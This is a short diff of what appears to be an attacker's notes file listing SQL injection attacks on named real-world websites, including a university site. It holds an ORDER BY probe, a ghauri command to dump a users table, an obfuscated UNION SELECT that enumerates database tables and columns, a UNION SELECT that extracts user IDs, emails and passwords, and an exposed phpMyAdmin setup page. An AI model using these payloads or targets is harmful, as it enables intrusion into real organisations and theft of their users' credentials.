@@ -110,4 +110,10 @@ https://shaafi.com.pk/MemberDetail.php?id=30%27+ORDER+BY+14--+
 
 ghauri -u https://baqai.edu.pk/InstituteDetail.php?id=8 -D information_schema -T tables -C users --dump
 
+https://baqai.edu.pk/InstituteDetail.php?id=-8%27+union+select+1,2,3,(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a),5--+
+
+https://baqai.edu.pk/InstituteDetail.php?id=-8%27+union+select+1,2,3,concat_ws(0x3a3a,SYSTEMUSERID,USEREMAIL,USERPASSWORD),5+from+users--+
+
+
+
 https://wcipeg.com/phpmyadmin/setup/index.php?page=form&formset=Export#tab_Microsoft_Office
